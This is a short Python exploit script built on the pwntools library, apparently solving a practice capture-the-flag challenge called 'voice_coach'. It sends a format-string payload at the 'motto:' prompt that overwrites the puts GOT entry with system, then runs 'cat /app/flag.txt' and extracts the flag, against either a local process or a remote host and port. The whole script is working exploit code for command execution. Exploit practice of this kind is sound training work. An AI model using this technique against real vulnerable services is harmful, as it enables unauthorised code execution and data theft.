#!/usr/bin/env python3
import re
from pwn import *

context.binary = ELF("./build/voice_coach", checksec=False)
elf = context.binary

HOST = args.get("HOST", "127.0.0.1")
PORT = int(args.get("PORT", 1337))


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)


def main():
    io = start()

    puts_got = elf.got["puts"]
    system_plt = elf.plt["system"]
    offset = 14

    payload = fmtstr_payload(offset, {puts_got: system_plt}, write_size="short")

    io.sendlineafter(b"motto:", payload)
    io.recvuntil(b"not found", timeout=2)
    io.sendline(b"cat /app/flag.txt")

    out = io.recvall(timeout=2)
    m = re.search(rb"practice\{[^\n\r]+\}", out)
    if m:
        print(m.group(0).decode(errors="ignore"))
    else:
        print(out.decode(errors="ignore"))


if __name__ == "__main__":
    main()
